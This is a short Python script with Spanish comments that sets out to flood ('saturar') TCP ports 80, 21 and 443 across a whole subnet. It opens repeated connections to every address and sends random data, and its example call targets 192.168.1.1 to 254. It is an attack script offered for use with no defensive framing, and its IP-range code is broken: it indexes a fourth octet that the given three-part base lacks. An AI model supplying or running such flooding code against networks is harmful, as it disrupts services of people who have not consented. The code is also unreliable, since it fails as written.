import socket
import random

def saturar_puerto(ip, puerto):
  """
  Satura un puerto específico en una dirección IP.

  Args:
    ip: La dirección IP a la que se envía la saturación.
    puerto: El puerto a saturar.
  """

  for i in range(100):
    try:
      # Crea un socket TCP
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      # Conecta al puerto
      sock.connect((ip, puerto))
      # Envía datos aleatorios
      sock.send(str(random.random()).encode())
    except Exception:
      pass

def saturar_red(ip_base, rango_ip, puertos):
  """
  Satura una red con un rango de IPs y puertos.

  Args:
    ip_base: La dirección IP base de la red.
    rango_ip: El rango de IPs a saturar (por ejemplo, "1-254").
    puertos: Los puertos a saturar (por ejemplo, "80,21,443").
  """

  for ip in range(int(ip_base.split(".")[3]) + int(rango_ip.split("-")[0]), int(ip_base.split(".")[3]) + int(rango_ip.split("-")[1]) + 1):
    for puerto in puertos.split(","):
      saturar_puerto(f"{ip_base}.{ip}", int(puerto))

# Ejemplo de uso
saturar_red("192.168.1", "1-254", "80,21,443")
